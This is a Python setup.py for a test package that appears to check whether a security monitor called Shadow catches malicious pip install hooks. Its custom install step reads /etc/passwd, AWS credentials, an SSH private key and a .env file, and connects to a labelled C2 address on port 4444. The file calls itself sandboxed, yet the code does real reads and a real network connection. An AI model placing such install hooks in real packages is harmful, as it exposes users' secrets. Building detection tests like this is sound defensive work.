#!/usr/bin/env python3
"""
shadow-test-malicious-py setup.py

Safe test payload that triggers all Shadow detection paths via setup.py hooks.
ALL actions are sandboxed — nothing reaches the real filesystem or network.

Detection paths exercised:
  [1] Read /etc/passwd          → LSM BLOCKED at Ring 0
  [2] Read ~/.aws/credentials   → LSM BLOCKED at Ring 0
  [3] Read ~/.ssh/id_rsa        → LSM BLOCKED at Ring 0
  [4] TCP connect to C2 IP      → CONNECTION BLOCKED at Ring 0
  [5] Spawn curl                → [ALERT] suspicious process
  [6] Read .env                 → LSM BLOCKED at Ring 0
"""

import os
import sys
import subprocess
import socket
from setuptools import setup
from setuptools.command.install import install

class MaliciousInstall(install):
    """Custom install command that triggers malicious behavior during pip install"""
    
    def run(self):
        print("[shadow-test-py] Custom install hook running — simulating malicious payload...")
        
        # [1] Attempt to read /etc/passwd
        print("[shadow-test-py] [1] Attempting to read /etc/passwd...")
        try:
            with open("/etc/passwd", "r") as f:
                f.read()
            print("[shadow-test-py] /etc/passwd read successful")
        except PermissionError:
            print("[shadow-test-py] /etc/passwd blocked")
        except Exception as e:
            print(f"[shadow-test-py] /etc/passwd failed: {e}")
        
        # [2] Attempt to read ~/.aws/credentials
        print("[shadow-test-py] [2] Attempting to read ~/.aws/credentials...")
        try:
            home = os.path.expanduser("~")
            with open(f"{home}/.aws/credentials", "r") as f:
                f.read()
            print("[shadow-test-py] AWS credentials read successful")
        except (PermissionError, FileNotFoundError):
            print("[shadow-test-py] AWS credentials blocked or not found")
        except Exception as e:
            print(f"[shadow-test-py] AWS credentials failed: {e}")
        
        # [3] Attempt to read ~/.ssh/id_rsa
        print("[shadow-test-py] [3] Attempting to read ~/.ssh/id_rsa...")
        try:
            home = os.path.expanduser("~")
            with open(f"{home}/.ssh/id_rsa", "r") as f:
                f.read()
            print("[shadow-test-py] SSH key read successful")
        except (PermissionError, FileNotFoundError):
            print("[shadow-test-py] SSH key blocked or not found")
        except Exception as e:
            print(f"[shadow-test-py] SSH key failed: {e}")
        
        # [4] Attempt TCP connection to known C2 IP (185.220.101.47:4444)
        print("[shadow-test-py] [4] Attempting TCP connect to C2 IP 185.220.101.47:4444...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect(("185.220.101.47", 4444))
            print("[shadow-test-py] C2 connect successful")
            sock.close()
        except Exception as e:
            print(f"[shadow-test-py] C2 connect blocked: {e}")
        
        # [5] Spawn curl (suspicious downloader)
        print("[shadow-test-py] [5] Spawning curl...")
        try:
            result = subprocess.run(["curl", "--version"], capture_output=True, timeout=5)
            print("[shadow-test-py] curl spawn successful")
        except Exception as e:
            print(f"[shadow-test-py] curl spawn flagged: {e}")
        
        # [6] Attempt to read .env
        print("[shadow-test-py] [6] Attempting to read .env...")
        try:
            home = os.path.expanduser("~")
            with open(f"{home}/.env", "r") as f:
                f.read()
            print("[shadow-test-py] .env read successful")
        except (PermissionError, FileNotFoundError):
            print("[shadow-test-py] .env blocked or not found")
        except Exception as e:
            print(f"[shadow-test-py] .env failed: {e}")
        
        print("[shadow-test-py] Payload simulation complete.")
        
        # Call parent install to actually install the package
        super().run()

setup(
    name="shadow-test-malicious",
    version="1.0.0",
    description="Safe test package that triggers all Shadow detection paths",
    author="Shadow Analyzer Test",
    author_email="test@shadow.local",
    py_modules=["shadow_test"],
    cmdclass={"install": MaliciousInstall},
    python_requires=">=3.6",
)